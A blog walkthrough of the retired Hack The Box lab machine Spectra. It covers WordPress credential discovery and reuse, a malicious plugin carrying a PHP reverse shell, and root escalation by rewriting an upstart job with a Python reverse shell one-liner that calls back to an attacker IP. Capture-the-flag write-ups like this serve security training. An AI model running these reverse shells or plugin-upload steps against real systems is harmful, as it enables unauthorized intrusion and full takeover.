---
category: Walkthrough
date: 2021-06-26 16:00:00
header:
  og_image: https://i.imgur.com/KjpVjtL.png
  teaser: https://i.imgur.com/KjpVjtL.png
language: en-US
namespace: htb-spectra
redirect_from: /writeup/2021/06/htb-spectra
tags:
- HackTheBox
- HTB Easy
- HTB Linux
title: 'Walktrough: HTB Spectra'
---

Hello guys!

This week's machine will be **Spectra**, another easy-rated box from [Hack The Box](https://www.hackthebox.eu), created by [egre55](https://app.hackthebox.eu/users/1190).<!--more-->

:information_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.
{: .notice--info}

![HTB Spectra](https://i.imgur.com/OqO1ZZh.png){: .align-center}

## Enumeration

As usual, started with a quick `nmap` scan to enumerate all published services in this box.

```bash
$ target=10.10.10.229; nmap -sC -sV -Pn -oA quick $target
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-12 12:57 EST
Nmap scan report for 10.10.10.229
Host is up (0.079s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey:
|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
80/tcp   open  http    nginx 1.17.4
|_http-server-header: nginx/1.17.4
|_http-title: Site doesn't have a title (text/html).
3306/tcp open  mysql   MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.73 seconds
```

### 80/TCP - HTTP Service

After first access to this service, we notice a quite simple HTML page containing a message and two links.

While inspecting the source code of this page, we can see that both links refer to assets located at `spectra.htb` domain, which was later added to the local hosts file to correct name resolution.

![Spectra HTB - Issue Tracking page](https://i.imgur.com/ady30IK.png){: .align-center}

```html
<h1>Issue Tracking</h1>

<h2>Until IT set up the Jira we can configure and use this for issue tracking.</h2>

<h2><a href="http://spectra.htb/main/index.php" target="mine">Software Issue Tracker</a></h2>
<h2><a href="http://spectra.htb/testing/index.php" target="mine">Test</a></h2>
```

Accessing both links, I have noticed that these were WordPress websites but only the first (*Software Issue Tracker*) was working properly while the second (*Test*), was displaying a database connection error.

![HTB Spectra - Software Issue Tracker](https://i.imgur.com/QRXqNtu.png){: .align-center}

![HTB Spectra - Testing](https://i.imgur.com/lqTri7v.png){: .align-center}

#### WPScan

To gather more information about both WordPress sites, executed WPScan against them, but only worked to the first once the Test wasn't working correctly.

```bash
wpscan --url <url> -e vp,vt,tt,cb,dbe,u,m --plugins-detection aggressive --plugins-version-detection aggressive -f cli-no-color 2>&1 | tee "./wpscan_<url>.txt"
```

The following information was identified for the `main` (*Software Issue Tracking*) website:

- WordPress version: 5.4.2
- Users: administrator

Proceeding with a manual enumeration, also noticed that for *Testing* website there's no redirect to `index.php`, allowing us to list the directory content, allowing us to spot an interesting file: **`wp-config.php.save`**.

![image-20210515144447118](https://i.imgur.com/0pPowA4.png){: .align-center}

As this file isn't with the `*.php` extension, it won't be interpreted by the webserver, allowing us to download it, as the command line below.

```bash
wget http://spectra.htb/testing/wp-config.php.save
```

Inspecting its content, we can see the credentials for user **devtest**, as listed below:

> Username: devtest
>
> Password: devteam01

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'dev' );

...skipping 1 line
define( 'DB_USER', 'devtest' );

/** MySQL database password */
define( 'DB_PASSWORD', 'devteam01' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

As the `nmap` enumeration listed a MySQL database, tried to use these creds to authenticate to it but the source IP wasn't allowed to connect to the specified instance, preventing us to harvest some sensitive information from the database.

```bash
$ mysql -u devtest -p -h spectra.htb
Enter password:
ERROR 1130 (HY000): Host '10.10.10.10' is not allowed to connect to this MySQL server
```

As credential reuse is a common thing, tried to authenticate to WordPress with the password found for the username `administrator` and had success in it!

![HTB Spectra - Wordpress](https://i.imgur.com/7k3nxVN.png){: .align-center}

## Initial Access

Once we have access to the WordPress administration console, there are several ways to get a reverse shell with this permission, being the most common the upload of a malicious plugin to it with a web shell or reverse shell payload.

The easiest way would use the [wp_admin_shell_upload](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/unix/webapp/wp_admin_shell_upload.md) module from Metasploit Framework but, if you're preparing for the OSCP exam, where you should wisely choose when to use the msfconsole, using it for this isn't a good idea :smile:.

So, to create this plugin, I have executed the following steps:

- Created a file with the plugin header. This header must follow the minimum requirements as documented on [Header Requirements \| Plugin Developer Handbook \| WordPress Developer Resources](https://developer.wordpress.org/plugins/plugin-basics/header-requirements/). In our case I've created the file `evilplugin.php` with the contents below:

```php
/**
 * Plugin Name: evilplugin
  * Version: 1.0
  * Author: evilauthor
  * Author URI: http://evilplugin.test.com
  * License: GPL2
  */
```

- Create another file with the desired payload. In this case, as my objective is to directly get a reverse shell, made a copy of [Pentest Monkey's PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), changing the details to my IP address and port, saving it as `exploit.php`.

```php
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.10.10';  // CHANGE THIS
$port = 4443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

- Compress the file as below, where the file name must be the same as the plugin header with the zip extension.

```bash
$ zip evilplugin.zip evilplugin.php exploit.php
  adding: evilplugin.php (deflated 9%)
  adding: exploit.php (deflated 59%)
```
  
- Once created, accessed the WordPress portal, authenticated with the administrative account and, from the left side, selected the options *Plugins* > *Add New* and, at the top of the page, hit the button *Upload Plugin*

![HTB Spectra - Upload evilplugin.zip](https://i.imgur.com/UlBkZNE.png){: .align-center}

- Initialize the listener according to the configured payload. In our case, I've started a `netcat` listener using the command line below

```bash
nc -lnvp 4443
```

- Selected the zip file and hit the button *Install Now*

![HTB Spectra - Installed evilplugin.zip](https://i.imgur.com/sNlvuWi.png){: .align-center}

- As soon as the install request is processed, is important to issue the request to the file location under the WordPress folder structure. The command line below uses `curl` to make the request, but you could use your browser as well.

```bash
curl -L http://spectra.htb/main/wp-content/plugins/evilplugin/exploit.php
```

After this process, we should receive a connection from the victim machine, we below: :smiley:

```bash
$ nc -lnvp 4443
listening on [any] 4443 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.229] 43298
Linux spectra 5.4.66+ #1 SMP Tue Dec 22 13:39:49 UTC 2020 x86_64 AMD EPYC 7401P 24-Core Processor AuthenticAMD GNU/Linux
 08:41:48 up 4 min,  0 users,  load average: 0.26, 0.31, 0.17
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
uid=20155(nginx) gid=20156(nginx) groups=20156(nginx)
nginx@spectra / $ id
id
uid=20155(nginx) gid=20156(nginx) groups=20156(nginx)
nginx@spectra / $
```

:bulb: **Tip:** There are several ways to achieve the same outcome not using the Metasploit framework. You could inject code into a Theme file or even use other scripts/tools available like [n00py/WPForce: WordPress Attack Suite (github.com)](https://github.com/n00py/WPForce), which automates this and other tasks frequently used while compromising WordPress sites.
{: .notice--info}

## User flag

After the initial access, initiated the machine enum using `linpeas.sh`, where the following details were identified:

- User: **nginx**, without any special privileges (`uid=20155(nginx) gid=20156(nginx) groups=20156(nginx)`)

- Operating System: **Chromium OS 11**.0_pre399094_p20200824-r6

- Content published using Nginx from `/usr/local/share/nginx/html` directory, vide file path of `wp-config.php` files, where the creds below were also harvested:

  | site    | Username | Password      |
  | ------- | -------- | ------------- |
  | main    | dev      | development01 |
  | testing | devtest  | devteam01     |

- Users with console access, being a possible elevation path, as well as their privileges:

```plaintext
[+] Users with console
chronos:x:1000:1000:system_user:/home/chronos/user:/bin/bash
katie:x:20156:20157::/home/katie:/bin/bash
root:x:0:0:root:/root:/bin/bash

uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers)
uid=1001(chronos-access) gid=1001(chronos-access) groups=1001(chronos-access)
```

- MySQL  Ver 14.14 Distrib 5.7.20-19, for Linux (x86_64) using  6.3

- Possible SSH keys

```plaintext
/usr/share/chromeos-ssh-config/keys/authorized_keys
/usr/share/chromeos-ssh-config/keys/id_rsa
/usr/share/chromeos-ssh-config/keys/id_rsa.pub
```

- Uncommon passwd files, being one of them for **autologin** containing the password **SummerHereWeCome!!**

```plaintext
[+] Searching uncommon passwd files (splunk)
passwd file: /etc/autologin/passwd
passwd file: /etc/pam.d/passwd
passwd file: /usr/share/baselayout/passwd

/etc/autologin/passwd
-rw-r--r-- 1 root root 19 Feb  3 16:43 /etc/autologin/passwd
SummerHereWeCome!!
```

- File `user.txt` at **katie**'s home path, seen from a manual enumeration.

Once we have found some passwords, decided to test them for users `katie` and `chronos`, being successful with the combination **katie:SummerHereWeCome!!**

With access to this profile, got the user flag in her home directory

```bash
katie@spectra ~ $ id
uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers)
katie@spectra ~ $ cat user.txt
e89d27fe195e9114ffa72ba8913a6130
katie@spectra ~ $
```

## Root flag

As we had katie's password, the first thing I did was to check if she was able to run something as root, as the following entry was found.

```bash
katie@spectra ~ $ sudo -l
User katie may run the following commands on spectra:
    (ALL) SETENV: NOPASSWD: /sbin/initctl
katie@spectra ~ $
```

Checking the binary, identified that it could be used to control jobs in the machine, as instructed below, but we would need to tamper with one of these jobs to get root access.

```bash
katie@spectra ~ $ /sbin/initctl help
Job commands:
  start                       Start job.
  stop                        Stop job.
  restart                     Restart job.
  reload                      Send HUP signal to job.
  status                      Query status of job.
  list                        List known jobs.

Event commands:
  emit                        Emit an event.

Other commands:
  reload-configuration        Reload the configuration of the init daemon.
  version                     Request the version of the init daemon.
  log-priority                Change the minimum priority of log messages from the init daemon
  show-config                 Show emits, start on and stop on details for job configurations.
  help                        display list of commands
```

Once katie's is a member of the **developers** group, decided to look for files where this group was under the permissions and found some files in `/etc/init` folder, listed as jobs by `initctl`.

```bash
katie@spectra ~ $ find / -group developers 2>/dev/null
/etc/init/test6.conf
/etc/init/test7.conf
/etc/init/test3.conf
/etc/init/test4.conf
/etc/init/test.conf
/etc/init/test8.conf
/etc/init/test9.conf
/etc/init/test10.conf
/etc/init/test2.conf
/etc/init/test5.conf
/etc/init/test1.conf
/srv
/srv/nodetest.js
katie@spectra ~ $ ls -la /etc/init/test*
-rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test.conf
-rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test1.conf
-rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test10.conf
-rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test2.conf
-rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test3.conf
-rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test4.conf
-rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test5.conf
-rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test6.conf
-rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test7.conf
-rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test8.conf
-rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test9.conf
```

To gain root access, I just needed to change one of the job files to get a reverse shell and then get the root's flag.

I have chosen the file `/etc/init/test10.conf`, which had the content below, and changed only the script section, as the second block shared below.

```bash
katie@spectra ~ $ cat /etc/init/test10.conf
description "Test node.js server"
author      "katie"

start on filesystem or runlevel [2345]
stop on shutdown

script

    export HOME="/srv"
    echo $$ > /var/run/nodetest.pid
    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js

end script
```

```bash
# Edited portion
script
  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
end script
```

After editing the file, initiated the `netcat` listener and stopped and started again the job, getting a reverse shell

```bash
# At Spectra as Kali
katie@spectra /etc/init $ sudo /sbin/initctl stop test10
initctl: Unknown instance:
katie@spectra /etc/init $ sudo /sbin/initctl start test10
test10 start/running, process 4947
```

```bash
# At attacker machine
$ nc -lnvp 4443
listening on [any] 4443 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.229] 33606
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# cat /root/root.txt
<redacted>
```

I hope you guys have enjoyed it!

See you in the next post :smiley:
